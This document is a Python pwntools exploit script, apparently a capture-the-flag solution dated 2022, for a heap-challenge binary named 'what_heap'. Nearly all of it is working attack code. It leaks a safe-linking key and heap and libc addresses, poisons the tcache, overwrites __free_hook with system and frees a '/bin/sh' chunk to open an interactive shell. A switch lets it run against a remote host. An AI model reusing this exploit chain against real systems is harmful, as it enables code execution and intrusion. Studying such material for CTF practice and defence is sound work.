# -*- encoding: utf-8 -*-
import os 
from pwn import * 
binary = './what_heap'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('Your Choice: ',num)

def add(size1 , size2 , text = 'a\n' , text2 = 'b'*8):
    cmd(1)
    sla('title size:' , size1)
    sla('content size:' , size2)
    sa('title: ' , text)
    sa('content: ' , text2)

def edit(idx , text ,text2):
    cmd(4)
    sla('idx:' , idx)
    sla('title: ' , text)
    sa('content: ' , text2)

def show(idx ):
    cmd(3)
    sla('idx:' , idx)

def delete(idx ):
    cmd(2)
    sla('idx:' , idx)

def decode(offset , key):
    return (offset  >> 4)^key

# 0x203080

def attack():
    
    add(0x18,0x50 , p64(0x50)*3 ,'a'*0x50 )
    add(0x18,0x50, p64(0x50)*3)
    add(0x18,0x50, p64(0x50)*3)
    add(0x28,0x50, p64(0x50)*5)
    add(0x28,0x50, p64(0x50)*5)
    delete(1)
    show(0)
    ru('content: ')
    p.recv(0x50)
    key = uu64(8)
    delete(2)
    
    add(1,0x50,'\x50')
    # 我的问题就出现在这里，可以申请任意大小内存泄漏起来其实比较方便
    
    show(1)
    ru('title: ')
    heap_base = uu64(6) & 0xfffffffff000
    delete(1)
    add(0x18,0x50, p64(0x50)*2+ p64(key))
    add(0x18,0x50, p64(0x50)*2+ p64(key))
    delete(1)
    delete(2)
    delete(3)
    
    payload = 'a'*0x50 + p64(decode( 0xdeadbeef050 , key))[0:1]
    edit(0,'a' ,payload)
    add(0x28,0x50 ,p64(0x50)*5)
    add(0x28,0x50,p64(0x50)*5 ,p64(decode( heap_base + 0x2b0 , key)) )
    add(0x28,0x50,p64(0x50)*5 )
    
    add(0x28,0x50 )
    delete(2)
    delete(1)
    payload = flat(
        0,0x31,
        heap_base + 0x10 + 0x8
    )
    edit(5 , 'a' , payload)
    add(0x28,0x50)
    add(0x28,0x50 , '\x07'*8+ '\n')
    
    payload = flat(
        0,0xc1,
    )
    edit(5 , 'a' ,payload)
    delete(1)
    add(0x28,0x50)
    add(0x28,0x50)
    add(0x28,0x50)
    
    show(3)
    
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)
    
    delete(4)
    delete(1)
    payload = flat(
        0,0x31,
        __free_hook -0x8
    )
    edit(5 , 'a' ,payload)
    add(0x28,0x50)
    add(0x28,0x50,flat('/bin/sh\x00' , system_addr) + '\n')
    lg('__free_hook',__free_hook)
    delete(4)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   what_heap.py
@Time    :   2022/06/19 09:39:58
@Author  :   Niyah 
'''